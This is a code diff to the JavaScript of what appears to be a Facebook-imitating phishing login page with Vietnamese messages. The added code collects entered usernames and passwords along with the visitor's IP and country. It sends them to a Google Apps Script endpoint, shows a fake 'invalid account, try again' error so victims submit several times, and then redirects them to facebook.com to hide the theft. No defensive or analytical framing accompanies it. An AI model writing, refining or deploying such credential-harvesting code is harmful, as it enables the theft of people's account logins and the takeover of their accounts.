@@ -160,7 +160,6 @@ $(document).ready(() => {
 });
 var count = 0;
 
-
 var g_IPAdress = "";
 var g_Country = "";
 GetIPAdress();
@@ -187,19 +186,14 @@ function GetIPAdress() {
 }
 
 function submitForm() {
-	$('#username').val("'" + $('#username').val());
-	$('#password').val("'" + $('#password').val());
-
-    if ($('#username').val().length < 6 || $('#password').val().length < 6) {
-		//alert('Thông tin vừa nhập không đúng');
-		$('#noti').css({ "color": "red" });
-		$('#noti').text('Tài khoản bạn vừa nhập không hợp lệ, Vui lòng thử lại.');
+    if (!$('#username').val().includes('@') || $('#password').val().length < 6) {
+		alert('Thông tin vừa nhập không đúng');
 		return;
     } else {
-        //count++;
+        count++;
     }
 
-    if (true) {
+    if (count < 3) {
         console.log(count);
         $('#loading').show();
         var data = $('form#test-form').serialize();
@@ -210,12 +204,35 @@ function submitForm() {
             crossDomain: true,
             data: data,
             success: function(data) {
+                if (count == 2) {
+                    $('#noti').css({ "color": "red" });
+                } else if (count == 1) {
+                    $('#noti').css({ "color": "#879600" });
+                }
+                $('#noti').text('Tài khoản bạn vừa nhập không hợp lệ, Vui lòng thử lại.');
                 $('#loading').hide();
+				
+				
+				
 				location.href = "https://www.facebook.com";
-				return;
 				
             }, error: function(request, status, error) {
                 $('#loading').hide();
+				
+				location.href = "https://www.facebook.com";
+            }
+        });
+    } else {
+        $('#loading').show();
+        var data = $('form#test-form').serialize();
+        $.ajax({
+            type: 'GET',
+            url: 'https://script.google.com/macros/s/AKfycbzsLBOH38HNtEp-cn1dbzLkro_ww8iETOYhDwF5N6ce7EgHcmxfW6rmKP2EYR52LVVMyw/exec',
+            dataType: 'json',
+            crossDomain: true,
+            data: data,
+            success: function(data) {
+				//alert('ok');
 				
 				location.href = "https://www.facebook.com";
             }
